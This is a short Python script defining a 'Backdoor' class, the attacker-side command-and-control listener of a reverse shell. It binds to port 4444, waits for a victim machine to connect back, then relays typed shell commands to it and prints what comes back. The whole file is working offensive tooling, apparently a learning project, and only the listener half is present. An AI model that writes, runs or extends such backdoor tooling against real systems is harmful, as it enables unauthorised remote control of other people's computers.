#!/usr/bin/python3

import socket
import traceback
import base64
import json
import os
import subprocess
import time

quit_list = ['quit', 'exit', 'close', 'break', 'kill', 'bye']
command_list = ['mkdir', 'touch', 'cp', 'echo', 'cd']


class Backdoor:
    def __init__(self, server, host, port, client, addr):
        self.server = server
        self.host = host
        self.port = port
        self.client = client
        self.addr = addr


    def start_server(self):
        try:
            print('\nCreating socket...\n')
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            time.sleep(1)

            print('Binding to host and port...\n')
            self.server.bind((self.host, self.port))
            time.sleep(1)

            print('Start to listen...\n')
            self.server.listen(1)
            print(f'Listening on port \033[1m{self.port}\033[m...\n')
            time.sleep(1)

            print('\033[1m[-]\033[m waiting for connection...\n')
            self.client, self.addr = self.server.accept()
            print(f'\033[1;32m[+]\033[m Connection established to \033[1m{self.addr[0]}\033[m on port \033[1m{self.addr[1]}\033[m\n')
            time.sleep(1)

        except Exception as e:
            print(f'Error: {e}\n')
            print(traceback.format_exc())


    def shell_session(self):
        try:
            while True:
                #whoami_command = 'whoami'
                #self.client.send(whoami_command.encode('utf-8'))
                #whoami_output = self.server.recv(1024).decode('utf-8')
                #user = str(whoami_output)
                
                #current_dir_command = 'pwd'
                #self.client.send(current_dir_command.encode('utf-8'))
                #current_dir_output = self.server.recv(1024).decode('utf-8')
                #current_dir = str(current_dir_output)
                
                #if user == 'root':
                    #bash_symbol = '#'
                #else:
                    #bash_symbol = '$'
                    
                #prompt = f'{user}@{self.addr[0]}:{current_dir}{bash_symbol} '
                prompt = f'\n\033[1m{self.addr[0]}\033[m: '
        
                command = input(prompt).strip()
                if command.lower() in quit_list:
                    self.client.send(command.encode('utf'))
                    break
                elif command == '':
                    pass
                elif command[:3] == 'cd ':
                    self.client.send(command.encode())
                else:
                    self.client.send(command.encode('utf-8'))
                    output = self.client.recv(1024).decode('utf-8')
                    print(output)
            
            self.server.close()
        except Exception as e:
            print(f'Error: {e}')
            print(traceback.format_exc())


if __name__ == '__main__':
    try:
        host = '127.0.0.1'
        port = 4444

        backdoor = Backdoor(server=None, host=host, port=port, client=None, addr=None)
    
        print('Starting server...')
        backdoor.start_server()
        time.sleep(1)

        print(f'Opening shell session with {host}...')
        time.sleep(1)

        backdoor.shell_session()
    except KeyboardInterrupt:
        print('\nAborted it!\n')


